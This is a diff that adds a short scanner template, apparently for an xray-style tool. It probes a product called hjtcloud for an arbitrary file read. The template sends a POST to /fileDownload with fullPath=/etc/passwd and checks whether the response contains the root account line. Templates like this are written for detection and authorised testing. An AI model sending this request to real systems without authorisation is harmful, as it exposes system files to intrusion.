@@ -1,0 +1,18 @@
+id: hjtcloud-arbitrary-fileread
+
+info:
+    name: hjtcloud-arbitrary-fileread
+    author: B1anda0(https://github.com/B1anda0)
+    severity: high
+
+manual: true
+transport: http
+rules:
+    linux0:
+        request:
+            cache: true
+            method: POST
+            path: /fileDownload?action=downloadBackupFile
+            body: fullPath=/etc/passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: linux0()
